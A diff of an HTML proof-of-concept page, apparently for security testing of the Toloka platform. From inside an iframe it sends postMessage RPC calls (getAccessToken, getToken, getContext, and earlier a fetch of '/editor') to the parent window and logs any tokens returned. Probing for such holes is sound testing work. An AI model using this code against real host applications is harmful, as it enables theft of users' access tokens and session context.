@@ -1,26 +1,45 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><title>RPC test</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Toloka PoC - RPC Access</title>
+  <style>
+    body { font-family: sans-serif; background: #111; color: #0f0; padding: 20px; }
+    pre { background: #000; padding: 10px; overflow: auto; }
+  </style>
+</head>
 <body>
-<h3>RPC PoC inside iframe</h3>
-<pre id="log"></pre>
-<script>
-const log = m => { console.log(m); document.getElementById('log').textContent += m + '\n'; };
+  <h1>🔓 Toloka PoC - Access from iframe</h1>
+  <p>Trying to call <code>getAccessToken</code>, <code>getToken</code>, and <code>getContext</code> via postMessage...</p>
 
-log('iframe origin: ' + location.origin);
-log('parent comparison: ' + (window === window.parent));   // يجب أن يكون false
+  <pre id="log">Waiting...</pre>
 
-const id = crypto.randomUUID();
-window.addEventListener('message', e => log('[recv] ' + JSON.stringify(e.data)));
+  <script>
+    const log = (msg) => {
+      document.getElementById("log").textContent += `\n${msg}`;
+    };
 
-window.parent.postMessage({
-  type: 'rpc',
-  id,
-  name: 'fetch',
-  payload: { url: '/editor', requestInit: { method: 'GET' } }
-}, '*');
+    function callRPC(method, payload = {}) {
+      const id = crypto.randomUUID();
+      window.addEventListener('message', function handler(e) {
+        if (e.data?.id === id) {
+          log(`[✅ ${method}] → ${JSON.stringify(e.data.payload, null, 2)}`);
+          window.removeEventListener('message', handler);
+        }
+      });
 
-log('[sent] id=' + id);
-</script>
+      window.parent.postMessage({
+        type: 'rpc',
+        id,
+        name: method,
+        payload
+      }, '*');
+
+      log(`[📤 ${method}] Request sent...`);
+    }
+
+    // Call all 3 methods
+    ['getAccessToken', 'getToken', 'getContext'].forEach(m => callRPC(m));
+  </script>
 </body>
 </html>
